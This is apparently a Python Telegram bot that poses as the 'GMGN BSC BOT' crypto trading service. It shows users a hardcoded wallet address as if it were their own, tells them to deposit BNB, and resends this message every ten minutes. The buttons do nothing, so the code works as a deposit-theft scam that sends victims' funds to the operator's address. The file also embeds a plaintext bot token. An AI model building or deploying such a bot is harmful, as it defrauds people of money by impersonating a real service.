
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackContext
from keep_alive import keep_alive

BOT_TOKEN = "8097068826:AAFMI1GhrUhBZFdTG_VC0ZV73CvGX0COR2Y"
WALLET_ADDRESS = "0xc74d7b820f19f1a3353f13ff6a352be4af56dd70"

async def send_welcome_periodically(context: CallbackContext):
    chat_id = context.job.chat_id
    keyboard = [
        [InlineKeyboardButton("👉 Buy/Sell", callback_data="buy/sell"),
         InlineKeyboardButton("💳 Wallet", callback_data="wallet")],
        [InlineKeyboardButton("⚙️ Setting", callback_data="setting"),
         InlineKeyboardButton("🌐 Language", callback_data="language")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    message = (
        f" *GMGN BSC BOT*\n"
        f"🌈 *Private node, lightning-fast transactions! ⚡⚡⚡*\n\n"
        f"💳 *Wallet (insufficient balance,please deposit 👇 ):*\n\n"
        f"`{WALLET_ADDRESS}`\n\n"
        f"💰 *Balance:* 0 BNB (Pnl ~) [View Activity](https://bscscan.com/address/{WALLET_ADDRESS})\n\n"
        f"👉 *Start To Use: * \n"
        f"   *Start Trading:* Send token contract address \n\n"
        f"🍿 *GMGN Multi-Chain Bot:*| [SOL]| [Base] (https://bscscan.com/)\n"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode="Markdown", reply_markup=reply_markup)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id

    # إرسال الترحيب فورًا عند /start
    keyboard = [
        [InlineKeyboardButton("👉 Buy/Sell", callback_data="buy/sell"),
         InlineKeyboardButton("💳 Wallet", callback_data="wallet")],
        [InlineKeyboardButton("⚙️ Setting", callback_data="setting"),
         InlineKeyboardButton("🌐 Language", callback_data="language")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    message = (
        f" *GMGN BSC BOT*\n"
        f"🌈 *Private node, lightning-fast transactions! ⚡⚡⚡*\n\n"
        f"💳 *Wallet (insufficient balance,please deposit 👇 ):*\n\n"
        f"`{WALLET_ADDRESS}`\n\n"
        f"💰 *Balance:* 0 BNB (Pnl ~) [View Activity](https://bscscan.com/address/{WALLET_ADDRESS})\n\n"
        f"👉 *Start To Use: * \n"
        f"   *Start Trading:* Send token contract address \n\n"
        f"🍿 *GMGN Multi-Chain Bot:*| [SOL]| [Base] (https://bscscan.com/)\n"
    )
    await update.message.reply_text(message, parse_mode="Markdown", reply_markup=reply_markup)

    # التكرار التلقائي
    context.job_queue.run_repeating(send_welcome_periodically, interval=600, first=0, chat_id=chat_id, name=str(chat_id))

if __name__ == '__main__':
    keep_alive()
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.run_polling()
